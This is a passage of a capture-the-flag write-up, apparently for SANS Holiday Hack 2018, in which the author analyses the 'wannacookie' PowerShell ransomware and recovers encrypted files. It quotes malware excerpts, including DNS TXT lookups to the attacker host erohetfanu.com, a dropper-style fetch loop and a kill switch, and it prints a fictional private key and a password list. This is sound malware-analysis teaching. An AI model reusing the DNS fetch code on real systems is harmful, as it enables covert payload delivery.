+<div class="codehilite"><pre><span></span><span class="k">if</span> <span class="p">(</span><span class="nv">$null</span> <span class="o">-ne</span> <span class="p">((</span><span class="nb">Resolve-DnsName</span> <span class="n">-Name</span> <span class="p">$(</span><span class="n">H2A</span> <span class="p">$(</span><span class="n">B2H</span> <span class="p">$(</span><span class="n">ti_rox</span> <span class="p">$(</span><span class="n">B2H</span> <span class="p">$(</span><span class="n">G2B</span> <span class="p">$(</span><span class="n">H2B</span> <span class="nv">$S1</span><span class="p">)))</span> <span class="p">$(</span><span class="nb">Resolve-DnsName</span> <span class="n">-Server</span> <span class="n">erohetfanu</span><span class="p">.</span><span class="n">com</span> <span class="n">-Name</span> <span class="n">6B696C6C737769746368</span><span class="p">.</span><span class="n">erohetfanu</span><span class="p">.</span><span class="n">com</span> <span class="n">-Type</span> <span class="n">TXT</span><span class="p">).</span><span class="n">Strings</span><span class="p">))).</span><span class="n">ToString</span><span class="p">()</span> <span class="n">-ErrorAction</span> <span class="n">0</span> <span class="n">-Server</span> <span class="n">8</span><span class="p">.</span><span class="n">8</span><span class="p">.</span><span class="n">8</span><span class="p">.</span><span class="n">8</span><span class="p">)))</span> <span class="p">{</span> <span class="k">return</span> <span class="p">};</span>
+</pre></div>
+
+
+<p>When it hits the breakpoint and throws you the debugger prompt, simply copy and paste the code that performs the DNS lookup and see what it says.</p>
+<div class="codehilite"><pre><span></span><span class="n">Hit</span> <span class="n">Line</span> <span class="n">breakpoint</span> <span class="n">on</span> <span class="s1">&#39;C:\hhc18\wannacookie.ps1:107&#39;</span>
+
+<span class="no">[DBG]</span><span class="err">:</span> <span class="nb">PS </span><span class="n">C</span><span class="err">:</span><span class="p">\</span><span class="n">hhc18</span><span class="p">&gt;&gt;</span> <span class="p">$(</span><span class="n">H2A</span> <span class="p">$(</span><span class="n">B2H</span> <span class="p">$(</span><span class="n">ti_rox</span> <span class="p">$(</span><span class="n">B2H</span> <span class="p">$(</span><span class="n">G2B</span> <span class="p">$(</span><span class="n">H2B</span> <span class="nv">$S1</span><span class="p">)))</span> <span class="p">$(</span><span class="nb">Resolve-DnsName</span> <span class="n">-Server</span> <span class="n">erohetfanu</span><span class="p">.</span><span class="n">com</span> <span class="n">-Name</span> <span class="n">6B696C6C737769746368</span><span class="p">.</span><span class="n">erohetfanu</span><span class="p">.</span><span class="n">com</span> <span class="n">-Type</span> <span class="n">TXT</span><span class="p">).</span><span class="n">Strings</span><span class="p">)))</span>
+<span class="n">yippeekiyaa</span><span class="p">.</span><span class="n">aaay</span>
+</pre></div>
+
+
+<p>Just for fun, let's examine what's happening here:</p>
+<ol>
+<li>Start with $S1 = "1f8b080000000000040093e76762129765e2e1e6640f6361e7e202000cdd5c5c10000000"</li>
+<li>Run $S1 through the H2B function (convert hex to bytes)</li>
+<li>Run resulting value through the G2B function (gzip decompress)</li>
+<li>Run resulting value through the B2H function (convert bytes to hex)</li>
+<li>Run resulting value through the ti_rox (xor_it backward!) function.  This requires a little more explanation.  The function takes two hex strings: one is the result from step 4, the other is the result of a DNS TXT query for 6B696C6C737769746368.erohetfanu.com, which is "66667272727869657268667865666B73", which is a hex encoded text string "ffrrrxierhfxefks".  It runs both values through the H2B (hex to bytes) function, and then returns the result of a XOR operation of one against the other.</li>
+<li>Run resulting value through the B2H function again (convert bytes to hex)</li>
+<li>Finally, run resulting value through the H2A function (hex to ), and voila, we have yippeekiyaa.aaay!</li>
+</ol>
+<p><center><img alt="Clark Grizwald" src="img/clark.jpg" /></center></p>
+<p>Once we register the yippeekiyaa.aaay domain at HoHoHoDaddy, we get a message <strong>Successfully registered yippeekiyaa.aaay!</strong> which completes the part of the objective.</p>
+<h2 id="part-4-recover-the-password">Part 4: Recover the Password</h2>
+<h3 id="problem_4">Problem</h3>
+<p>Recover Alabaster's password as found in the the encrypted password vault.</p>
+<h3 id="solution_3">Solution</h3>
+<p>The last bit of the challenge is to decrypt Alabaster's password vault, which the wannacookie malware encrypted.  We don't want to pay the ransom, so let's see if we can find a way around that.</p>
+<p>Wannacookie employs public key cryptography to protect the symmetric key it uses to encrypt and decrypt files.  Theoretically, by encrypting the file encryption key with the attacker's public key, only the attacker can then decrypt it using his private key.</p>
+<p>As we see in the static analysis above, one of the first things wannacookie does is download a certificate from the DNS server.  The certificate contains the attacker's public key.</p>
+<div class="codehilite"><pre><span></span><span class="nv">$pub_key</span> <span class="p">=</span> <span class="no">[System.Convert]</span><span class="p">::</span><span class="n">FromBase64String</span><span class="p">($(</span><span class="n">get_over_dns</span><span class="p">(</span><span class="s2">&quot;7365727665722E637274&quot;</span><span class="p">)</span> <span class="p">)</span> <span class="p">)</span>
+</pre></div>
+
+
+<p>"7365727665722E637274" is hex-encoded text string "server.crt", which is a common filename used to store a public key.  Usually right along side of this file on the server would be server.key, which is the private key.</p>
+<p>What do you suppose would happen if we asked for server.key ("7365727665722e6b6579")?  To make things easy, we re-use the dropper code from step 2:</p>
+<div class="codehilite"><pre><span></span><span class="nb">PS </span><span class="n">C</span><span class="err">:</span><span class="p">\</span><span class="n">hhc18</span><span class="p">&gt;</span> <span class="k">function</span> <span class="n">H2A</span><span class="p">(</span><span class="nv">$a</span><span class="p">)</span> <span class="p">{</span><span class="nv">$o</span><span class="p">;</span> <span class="nv">$a</span> <span class="n">-split</span> <span class="s1">&#39;(..)&#39;</span> <span class="p">|</span> <span class="p">?</span> <span class="p">{</span> <span class="nv">$_</span> <span class="p">}</span>  <span class="p">|</span> <span class="k">forEach</span> <span class="p">{</span><span class="no">[char]</span><span class="p">(</span><span class="no">[convert]</span><span class="p">::</span><span class="n">toint16</span><span class="p">(</span><span class="nv">$_</span><span class="p">,</span><span class="n">16</span><span class="p">))}</span> <span class="p">|</span> <span class="k">forEach</span> <span class="p">{</span><span class="nv">$o</span> <span class="p">=</span> <span class="nv">$o</span> <span class="p">+</span> <span class="nv">$_</span><span class="p">};</span> <span class="k">return</span> <span class="nv">$o</span><span class="p">};</span> <span class="nv">$f</span> <span class="p">=</span> <span class="s2">&quot;7365727665722e6b6579&quot;</span><span class="p">;</span> <span class="nv">$h</span> <span class="p">=</span> <span class="s2">&quot;&quot;</span><span class="p">;</span> <span class="k">foreach</span> <span class="p">(</span><span class="nv">$i</span> <span class="k">in</span> <span class="n">0</span><span class="p">..(</span><span class="no">[convert]</span><span class="p">::</span><span class="n">ToInt32</span><span class="p">((</span><span class="nb">Resolve-DnsName</span> <span class="n">-Server</span> <span class="n">erohetfanu</span><span class="p">.</span><span class="n">com</span> <span class="n">-Name</span> <span class="s2">&quot;$f.erohetfanu.com&quot;</span> <span class="n">-Type</span> <span class="n">TXT</span><span class="p">).</span><span class="n">strings</span><span class="p">,</span> <span class="n">10</span><span class="p">)-</span><span class="n">1</span><span class="p">))</span> <span class="p">{</span><span class="nv">$h</span> <span class="p">+=</span> <span class="p">(</span><span class="nb">Resolve-DnsName</span> <span class="n">-Server</span> <span class="n">erohetfanu</span><span class="p">.</span><span class="n">com</span> <span class="n">-Name</span> <span class="s2">&quot;$i.$f.erohetfanu.com&quot;</span> <span class="n">-Type</span> <span class="n">TXT</span><span class="p">).</span><span class="n">strings</span><span class="p">};</span> <span class="p">($(</span><span class="n">H2A</span> <span class="nv">$h</span> <span class="p">|</span> <span class="nb">Out-string</span><span class="p">))</span>
+
+<span class="p">----</span><span class="n">-BEGIN</span> <span class="n">PRIVATE</span> <span class="n">KEY</span><span class="p">-----</span>
+<span class="n">MIIEvgIBADANBgkqhkiG9w0BAQEFAASCBKgwggSkAgEAAoIBAQDEiNzZVUbXCbMG</span>
+<span class="n">L4sM2UtilR4seEZli2CMoDJ73qHql</span><span class="p">+</span><span class="n">tSpwtK9y4L6znLDLWSA6uvH</span><span class="p">+</span><span class="n">lmHhhep9ui</span>
+<span class="n">W3vvHYCq</span><span class="p">+</span><span class="n">Ma5EljBrvwQy0e2Cr</span><span class="p">/</span><span class="n">qeNBrdMtQs9KkxMJAz0fRJYXvtWANFJF5A</span><span class="p">+</span><span class="n">Nq</span>
+<span class="n">jI</span><span class="p">+</span><span class="n">jdMVtL8</span><span class="p">+</span><span class="n">PVOGWp1PA8DSW7i</span><span class="p">+</span><span class="n">9eLkqPbNDxCfFhAGGlHEU</span><span class="p">+</span><span class="n">cH0CTob0SB5Hk0S</span>
+<span class="n">TPUKKJVc3fsD8</span><span class="p">/</span><span class="n">t60yJThCw4GKkRwG8vqcQCgAGVQeLNYJMEFv0</span><span class="p">+</span><span class="n">WHAt2WxjWTu3</span>
+<span class="n">HnAfMPsiEnk</span><span class="p">/</span><span class="n">y12SwHOCtaNjFR8Gt512D7idFVW4p5sT0mrrMiYJ</span><span class="p">+</span><span class="n">7x6VeMIkrw4</span>
+<span class="n">tk</span><span class="p">/</span><span class="n">1ZlYNAgMBAAECggEAHdIGcJOX5Bj8qPudxZ1S6uplYan</span><span class="p">+</span><span class="n">RHoZdDz6bAEj4Eyc</span>
+<span class="n">0DW4aO</span><span class="p">+</span><span class="n">IdRaD9mM</span><span class="p">/</span><span class="n">SaB09GWLLIt0dyhRExl</span><span class="p">+</span><span class="n">fJGlbEvDG2HFRd4fMQ0nHGAVLqaW</span>
+<span class="n">OTfHgb9HPuj78ImDBCEFaZHDuThdulb0sr4RLWQScLbIb58Ze5p4AtZvpFcPt1fN</span>
+<span class="n">6YqS</span><span class="p">/</span><span class="n">y0i5VEFROWuldMbEJN1x</span><span class="p">+</span><span class="n">xeiJp8uIs5KoL9KH1njZcEgZVQpLXzrsjKr67U</span>
+<span class="n">3nYMKDemGjHanYVkF1pzv</span><span class="p">/</span><span class="n">rardUnS8h6q6JGyzV91PpLE2I0LY</span><span class="p">+</span><span class="n">tGopKmuTUzVOm</span>
+<span class="n">Vf7sl5LMwEss1g3x8gOh215Ops9Y9zhSfJhzBktYAQKBgQDl</span><span class="p">+</span><span class="n">w</span><span class="p">+</span><span class="n">KfSb3qZREVvs9</span>
+<span class="n">uGmaIcj6Nzdzr</span><span class="p">+</span><span class="n">7EBOWZumjy5WWPrSe0S6Ld4lTcFdaXolUEHkE0E0j7H8M</span><span class="p">+</span><span class="n">dKG2</span>
+<span class="n">Emz3zaJNiAIX89UcvelrXTV00k</span><span class="p">+</span><span class="n">kMYItvHWchdiH64EOjsWrc8co9WNgK1XlLQtG</span>
+<span class="n">4iBpErVctbOcjJlzv1zXgUiyTQKBgQDaxRoQolzgjElDG</span><span class="p">/</span><span class="n">T3VsC81jO6jdatRpXB</span>
+<span class="n">0URM8</span><span class="p">/</span><span class="n">4MB</span><span class="p">/</span><span class="n">vRAL8LB834ZKhnSNyzgh9N5G9</span><span class="p">/</span><span class="n">TAB9qJJ</span><span class="p">+</span><span class="n">4RYlUUOVIhK</span><span class="p">+</span><span class="n">8t863498</span>
+<span class="p">/</span><span class="n">P4sKNlPQio4Ld3lfnT92xpZU1hYfyRPQ29rcim2c173KDMPcO6gXTezDCa1h64Q</span>
+<span class="n">8iskC4iSwQKBgQCvwq3f40HyqNE9YVRlmRhryUI1qBli</span><span class="p">+</span><span class="n">qP5ftySHhqy94okwerE</span>
+<span class="n">KcHw3VaJVM9J17Atk4m1aL</span><span class="p">+</span><span class="n">v3Fh01OH5qh9JSwitRDKFZ74JV0Ka4QNHoqtnCsc4</span>
+<span class="n">eP1RgCE5z0w0efyrybH9pXwrNTNSEJi7tXmbk8azcdIw5GsqQKeNs6qBSQKBgH1v</span>
+<span class="n">sC9DeS</span><span class="p">+</span><span class="n">DIGqrN</span><span class="p">/</span><span class="n">0tr9tWklhwBVxa8XktDRV2fP7XAQroe6HOesnmpSx7eZgvjtVx</span>
+<span class="n">moCJympCYqT</span><span class="p">/</span><span class="n">WFxTSQXUgJ0d0uMF1lcbFH2relZYoK6PlgCFTn1TyLrY7</span><span class="p">/</span><span class="n">nmBKKy</span>
+<span class="n">DsuzrLkhU50xXn2HCjvG1y4BVJyXTDYJNLU5K7jBAoGBAMMxIo7</span><span class="p">+</span><span class="n">9otN8hWxnqe4</span>
+<span class="n">Ie0RAqOWkBvZPQ7mEDeRC5hRhfCjn9w6G</span><span class="p">+</span><span class="n">2</span><span class="p">+/</span><span class="n">7dGlKiOTC3Qn3wz8QoG4v5xAqXE</span>
+<span class="n">JKBn972KvO0eQ5niYehG4yBaImHH</span><span class="p">+</span><span class="n">h6NVBlFd0GJ5VhzaBJyoOk</span><span class="p">+</span><span class="n">KnOnvVYbrGBq</span>
+<span class="n">UdrzXvSwyFuuIqBlkHnWSIeC</span>
+<span class="p">----</span><span class="n">-END</span> <span class="n">PRIVATE</span> <span class="n">KEY</span><span class="p">-----</span>
+</pre></div>
+
+
+<p>So we retreived the attacker's private key.  I'm sure he didn't mean to leave that lying around!  Now if we can get our hands on some data that was encrypted with the server's public key (specifically, the file encryption key), then we should be able to decrypt it.</p>
+<p>We know from our static analysis that the encryption key is cleared from memory after the files are encrypted, so we're not going to find that key anywhere in memory.  However, the encrypted key ($Pub_key_encrypted_Key) is not cleared from memory, so it should be in the memory dump file that Alabaster provided.</p>
+<div class="codehilite"><pre><span></span><span class="nv">$Pub_key_encrypted_Key</span> <span class="p">=</span> <span class="p">(</span><span class="n">Pub_Key_Enc</span> <span class="nv">$Byte_key</span> <span class="nv">$pub_key</span><span class="p">).</span><span class="n">ToString</span><span class="p">()</span>
+</pre></div>
+
+
+<p>Using the debugger again, we can check to see what the encrypted file encryption key looks like.  In order to get the malware to run far enough, we'll need to comment out the kill switch that checks to see if the computer is a member of the KRINGLECASTLE domain.</p>
+<div class="codehilite"><pre><span></span><span class="c">#if ($(netstat -ano | Select-String &quot;127.0.0.1:8080&quot;).length -ne 0 -or (Get-WmiObject Win32_ComputerSystem).Domain -ne &quot;KRINGLECASTLE&quot;) {return}</span>
+</pre></div>
+
+
+<p>Now create a breakpoint right after the $Pub_key_encrypted_key variable is set, and run the program.  When you hit the breakpoint, take a look inside $Pub_key_encrypted_key to see what the value of that variable is.</p>
+<p><img alt="Encrypted Key as seen in debugger" src="img/malware-encryptedkey.png" /></p>
+<p>As you can see, the is 512 bytes in length and is made up of hexadecimal characters.  Use the PowerDump tool that was introduced in Chris Davis' KringleCon talk to search through Alabaster's memory dump for a variable containing data matching those characteristics.</p>
+<p>To keep this brief, I've cut out all of the menus and am displaying only the options and commands that were run in Powerdump, along with some explaination of what we're doing:</p>
+<div class="codehilite"><pre><span></span>==============================
+ |  __ \
+ | |__) |____      _____ _ __
+ |  ___/ _ \ \ /\ / / _ \ &#39;__|
+ | |  | (_) \ V  V /  __/ |
+ |_|   \___/ \_/\_/ \___|_|
+ __                       __
+ \ \         (   )       / /
+  \ \_    (   ) (      _/ /
+   \__\    ) _   )    /__/
+      \\    ( \_     //
+       `\ _(_\ \)__ /&#39;
+         (____\___))
+  _____  _    _ __  __ _____
+ |  __ \| |  | |  \/  |  __ \
+ | |  | | |  | | \  / | |__) |
+ | |  | | |  | | |\/| |  ___/
+ | |__| | |__| | |  | | |
+ |_____/ \____/|_|  |_|_|
+Dumps PowerShell From Memory
+==============================
+
+: 1 (Load PowerShell Memory Dump File)
+
+: ld c:\hhc18\forensic_artifacts\powershell.exe_181109_104716.dmp (Load Alabaster&#39;s dump file)
+
+: b (Back to previous menu)
+
+: 2 (Process the dump file)
+
+: 4 (Search/Dump Stored PS Variables)
+
+: len == 512 (Set search criteria for values that are 512 bytes long)
+
+: matches &quot;^[a-fA-F0-9]*$&quot; (Set search criteria for values containing only hexadecimal characters)
+
+: print (Print all of the matching values found)
+</pre></div>
+
+
+<p>This produces the following output:</p>
+<div class="codehilite"><pre><span></span>3cf903522e1a3966805b50e7f7dd51dc7969c73cfb1663a75a56ebf4aa4a1849d1949005437dc44b8464dca05680d531b7a971672d87b24b7a6d672d1d811e6c34f42b2f8d7f2b43aab698b537d2df2f401c2a09fbe24c5833d2c5861139c4b4d3147abb55e671d0cac709d1cfe86860b6417bf019789950d0bf8d83218a56e69309a2bb17dcede7abfffd065ee0491b379be44029ca4321e60407d44e6e381691dae5e551cb2354727ac257d977722188a946c75a295e714b668109d75c00100b94861678ea16f8b79b756e45776d29268af1720bc49995217d814ffd1e4b6edce9ee57976f9ab398f9a8479cf911d7d47681a77152563906a2c29c6d12f971
+Variable Values #1 above ^
+Type any key to go back and just Enter to Continue...
+</pre></div>
+
+
+<p>Since we only came up with one matching value, we'll have to assume that's the one we're looking for.</p>
+<p>To make it easy to use the private key, we can import it into the Windows certificate store.  First, create a PKCS #12 format file to hold the certificate and private key.</p>
+<div class="codehilite"><pre><span></span>C:\hhc18&gt; openssl pkcs12 -export -out wannacookie.pfx -inkey server.key -in server.crt
+</pre></div>
+
+
+<p>Import this into the current user's Personal certificate store using the Certificates MMC add-on.  </p>
+<p><img alt="Certificate Manager" src="img/malware-certmgr.png" /></p>
+<p>Now modify the malware a little bit to reverse the encryption.  Make a copy of the wannacookie.ps1 file and remove the wannacookie function.  This will give us access to all of the program's other functions so we don't have to reinvent the wheel entirely.  Then, add the following code at the end of the file:</p>
+<div class="codehilite"><pre><span></span><span class="nv">$encrypted_key</span> <span class="p">=</span> <span class="s1">&#39;3cf903522e1a3966805b50e7f7dd51dc7969c73cfb1663a75a56ebf4aa4a1849d1949005437dc44b8464dca05680d531b7a971672d87b24b7a6d672d1d811e6c34f42b2f8d7f2b43aab698b537d2df2f401c2a09fbe24c5833d2c5861139c4b4d3147abb55e671d0cac709d1cfe86860b6417bf019789950d0bf8d83218a56e69309a2bb17dcede7abfffd065ee0491b379be44029ca4321e60407d44e6e381691dae5e551cb2354727ac257d977722188a946c75a295e714b668109d75c00100b94861678ea16f8b79b756e45776d29268af1720bc49995217d814ffd1e4b6edce9ee57976f9ab398f9a8479cf911d7d47681a77152563906a2c29c6d12f971&#39;</span><span class="p">;</span>
+
+<span class="nv">$encrypted_key_bytes</span> <span class="p">=</span> <span class="p">$(</span><span class="n">H2B</span> <span class="nv">$encrypted_key</span><span class="p">);</span>
+
+<span class="nv">$cert</span> <span class="p">=</span> <span class="nb">Get-ChildItem</span> <span class="n">Cert</span><span class="err">:</span><span class="p">\</span><span class="n">CurrentUser</span><span class="p">\</span><span class="n">My</span><span class="p">\</span> <span class="p">`</span>
+<span class="p">|</span> <span class="nb">Where-Object</span> <span class="p">{</span><span class="nv">$_</span><span class="p">.</span><span class="n">Subject</span> <span class="o">-like</span> <span class="s2">&quot;O=Internet Widgits Pty Ltd*&quot;</span><span class="p">}</span>
+
+<span class="nv">$akey</span> <span class="p">=</span> <span class="nv">$cert</span><span class="p">.</span><span class="n">PrivateKey</span><span class="p">.</span><span class="n">Decrypt</span><span class="p">(</span><span class="nv">$encrypted_key_bytes</span><span class="p">,</span> <span class="nv">$true</span><span class="p">)</span>
+
+<span class="no">[array]</span><span class="nv">$allcookies</span> <span class="p">=</span> <span class="p">$(</span><span class="nb">Get-ChildItem</span> <span class="n">-Path</span> <span class="p">$(</span><span class="nv">$env:userprofile</span><span class="p">)</span> <span class="p">`</span>
+<span class="n">-Recurse</span>  <span class="n">-Filter</span> <span class="p">*.</span><span class="n">wannacookie</span> <span class="p">|</span> <span class="nb">where </span><span class="p">{</span> <span class="p">!</span> <span class="nv">$_</span><span class="p">.</span><span class="n">PSIsContainer</span> <span class="p">}</span> <span class="p">`</span>
+<span class="p">|</span> <span class="k">Foreach</span><span class="n">-Object</span> <span class="p">{</span><span class="nv">$_</span><span class="p">.</span><span class="n">Fullname</span><span class="p">})</span>
+
+<span class="n">enc_dec</span> <span class="nv">$akey</span> <span class="nv">$allcookies</span> <span class="nv">$false</span>
+</pre></div>
+
+
+<p>What does this do?</p>
+<ol>
+<li>Create a variable to hold the encrypted file encryption key obtained from Alabaster's memory dump</li>
+<li>Process the encrypted key through the H2B (hex to bytes) function provided by the malware</li>
+<li>Fetch the certificate (which now also contains the private key) from the current user's certificate store and place it in $cert</li>
+<li>Decrypt the file encryption key and store it in $akey</li>
+<li>Using the original code from the malware, create a list of files in the user's profile containing *.wannacookie</li>
+<li>Pass the decrypted file encryption key (now in $akey) along with the list of files to the enc_dec function</li>
+</ol>
+<p>After running the modified code, I can now see that the .wannacookie extension has been removed from Alabaster's elfdb password file!  </p>
+<p>The first few bytes of the file indicate that this is a SQLite database file, so we'll have to load the file into SQLite and run a query to pull out the data.</p>
+<div class="codehilite"><pre><span></span>C:\SQLite&gt;sqlite3.exe
+SQLite version 3.26.0 2018-12-01 12:34:55
+Enter &quot;.help&quot; for usage hints.
+Connected to a transient in-memory database.
+Use &quot;.open FILENAME&quot; to reopen on a persistent database.
+sqlite&gt; .open C:/Users/IEUser/Documents/forensic_artifacts/alabaster_passwords.elfdb
+sqlite&gt; .schema
+CREATE TABLE IF NOT EXISTS &quot;passwords&quot; (
+        `name`  TEXT NOT NULL,
+        `password`      TEXT NOT NULL,
+        `usedfor`       TEXT NOT NULL
+);
+sqlite&gt; select * from passwords;
+alabaster.snowball|CookiesR0cK!2!#|active directory
+alabaster@kringlecastle.com|KeepYourEnemiesClose1425|www.toysrus.com
+alabaster@kringlecastle.com|CookiesRLyfe!*26|netflix.com
+alabaster.snowball|MoarCookiesPreeze1928|Barcode Scanner
+alabaster.snowball|ED#ED#EED#EF#G#F#G#ABA#BA#B|vault
+alabaster@kringlecastle.com|PetsEatCookiesTOo@813|neopets.com
+alabaster@kringlecastle.com|YayImACoder1926|www.codecademy.com
+alabaster@kringlecastle.com|Woootz4Cookies19273|www.4chan.org
+alabaster@kringlecastle.com|ChristMasRox19283|www.reddit.com
+</pre></div>
+
+
+<p>Amongst a list of other passwords, we can see that the vault password for alabaster.snowball is <strong>ED#ED#EED#EF#G#F#G#ABA#BA#B</strong>, which completes this final part of the objective.</p>
+                
+                  
+                
+              
+              
+                
+
+
+              
+            </article>
+          </div>
+        </div>
+      </main>
+      
+        
+<footer class="md-footer">
+  
+    <div class="md-footer-nav">
+      <nav class="md-footer-nav__inner md-grid">
+        
+          <a href="8-packalyzer.html" title="Network Traffic Forensics" class="md-flex md-footer-nav__link md-footer-nav__link--prev" rel="prev">
+            <div class="md-flex__cell md-flex__cell--shrink">
+              <i class="md-icon md-icon--arrow-back md-footer-nav__button"></i>
+            </div>
+            <div class="md-flex__cell md-flex__cell--stretch md-footer-nav__title">
+              <span class="md-flex__ellipsis">
+                <span class="md-footer-nav__direction">
+                  Previous
+                </span>
+                Network Traffic Forensics
+              </span>
+            </div>
+          </a>
+        
+        
+          <a href="10-whodunit.html" title="Who is Behind it All?" class="md-flex md-footer-nav__link md-footer-nav__link--next" rel="next">
+            <div class="md-flex__cell md-flex__cell--stretch md-footer-nav__title">
+              <span class="md-flex__ellipsis">
+                <span class="md-footer-nav__direction">
+                  Next
+                </span>
+                Who is Behind it All?
+              </span>
+            </div>
+            <div class="md-flex__cell md-flex__cell--shrink">
+              <i class="md-icon md-icon--arrow-forward md-footer-nav__button"></i>
+            </div>
+          </a>
+        
+      </nav>
+    </div>
+  
+  <div class="md-footer-meta md-typeset">
+    <div class="md-footer-meta__inner md-grid">
+      <div class="md-footer-copyright">
+        
+        powered by
+        <a href="https://www.mkdocs.org">MkDocs</a>
+        and
+        <a href="https://squidfunk.github.io/mkdocs-material/">
+          Material for MkDocs</a>
+      </div>
+      
+        
+      
+    </div>
+  </div>
+</footer>
+      
+    </div>
+    
+      <script src="../assets/javascripts/application.b41f3d20.js"></script>
+      
+      <script>app.initialize({version:"1.0.4",url:{base:".."}})</script>
+      
+    
+    
+      
+    
+  </body>
+</html>
